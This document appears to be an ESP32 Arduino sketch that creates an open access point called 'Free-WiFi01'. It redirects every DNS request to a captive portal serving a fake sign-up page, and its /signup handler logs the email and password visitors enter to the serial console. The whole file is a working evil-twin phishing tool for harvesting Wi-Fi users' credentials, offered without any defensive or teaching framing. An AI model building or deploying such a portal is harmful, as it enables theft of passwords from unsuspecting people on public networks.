#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>

DNSServer dnsServer;
WebServer server(80);

static const char responsePortal[] = R"===(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <style>
        body {
            font-family: Arial, sans-serif;
            padding: 20px;
            background: #f3f3f3;
        }
        h1 {
            color: #b30000;
        }
        input {
            display: block;
            margin-bottom: 5px;
            padding: 8px;
            width: 250px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        input.error {
            border: 2px solid red;
        }
        .error-msg {
            color: red;
            font-size: 14px;
            margin-bottom: 10px;
        }
        button {
            padding: 8px 16px;
            background: #b30000;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background: #e60000;
        }
        button  {
            padding: 8px 15px;
            background: #b30000;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .rules {
            font-size: 14px;
            color: #555;
        }
        pre {
            background: #fff;
            padding: 10px;
            border-radius: 10px;
            box-shadow: 0px 0px 5px #ccc;
        }
    </style>
</head>
<body>

<h1>User Sign Up</h1>
<p>Please Sign up with new Account!</p>

<form action="/signup" method="GET">
  <input type="text" name="mail" placeholder="Mail (Ex: Example@domain.com)">
  <input type="text" name="pwd" placeholder="Password">
  <button type="submit">Sign Up!</button>
</form>

<pre>
  |\__/,|   (`\
_.|o o  |_   ) )
-(((---(((--------
</pre>
<script>
function validar() {
    let correo = document.getElementById("correo").value;
    let pass = document.getElementById("pass").value;

    let correoMsg = document.getElementById("correo-msg");
    let passMsg = document.getElementById("pass-msg");

    // ----------- RESETEAR ESTILOS -----------
    correoMsg.textContent = "";
    passMsg.textContent = "Reglas: mínimo 8 caracteres, debe tener un número o un símbolo";
    document.getElementById("correo").classList.remove("error");
    document.getElementById("pass").classList.remove("error");

    let valido = true;

    // ----------- VALIDAR CORREO -----------
    if (!(correo.includes("@") && correo.includes("."))) {
        correoMsg.textContent = "Correo no válido :c";
        document.getElementById("correo").classList.add("error");
        valido = false;
    }

    // ----------- VALIDAR CONTRASEÑA -----------
    let tieneNumero = /[0-9]/.test(pass);
    let tieneSimbolo = /[!@#$%^&*()\-_=+{}[\]:;"',.<>/?]/.test(pass);
    let largo = pass.length >= 8;

    if (!largo || !(tieneNumero || tieneSimbolo)) {
        document.getElementById("pass").classList.add("error");
        let errores = [];
        if (!largo) errores.push("mínimo 8 caracteres");
        if (!(tieneNumero || tieneSimbolo)) errores.push("al menos un número o símbolo");
        passMsg.textContent = "Reglas: " + errores.join(", ");
        valido = false;
    }

    // Si todo está bien
    if (valido) {
        alert("¡Todo válido!");
    }
}
</script>

</body>
</html>

)===";

// index page handler
void handleRoot() {
  server.send(200, "text/plain", "Welcome!");
}

// this will redirect unknown http req's to our captive portal page
// based on this redirect various systems could detect that WiFi AP has a captive portal page
void handleNotFound() {
  server.sendHeader("Location", "/portal");
  server.send(302, "text/plain", "redirect to captive portal");
}                                        

void setup() {
  Serial.begin(115200);
  WiFi.AP.begin();
  WiFi.AP.create("Free-WiFi01");
  WiFi.AP.enableDhcpCaptivePortal();

  // by default DNSServer is started serving any "*" domain name. It will reply
  // AccessPoint's IP to all DNS request (this is required for Captive Portal detection)
  if (dnsServer.start()) {
    Serial.println("Started DNS server in captive portal-mode");
  } else {
    Serial.println("Err: Can't start DNS server!");
  }

  // serve a simple root page
  server.on("/", handleRoot);

  // serve portal page
  server.on("/portal", []() {
    server.send(200, "text/html", responsePortal);
  });

  server.on("/signup", HTTP_GET, []() {
    String Mail = server.arg("mail");
    Serial.println("Correo: " + Mail);
    String Password = server.arg("pwd");
    Serial.println("Contraseña: " + Password);
    Serial.println("RECIBIDO BROCHACHO!");
  });

  // all unknown pages are redirected to captive portal
  server.onNotFound(handleNotFound);
  server.begin();
}

void loop() {
  server.handleClient();
  delay(5);  // give CPU some idle time
}
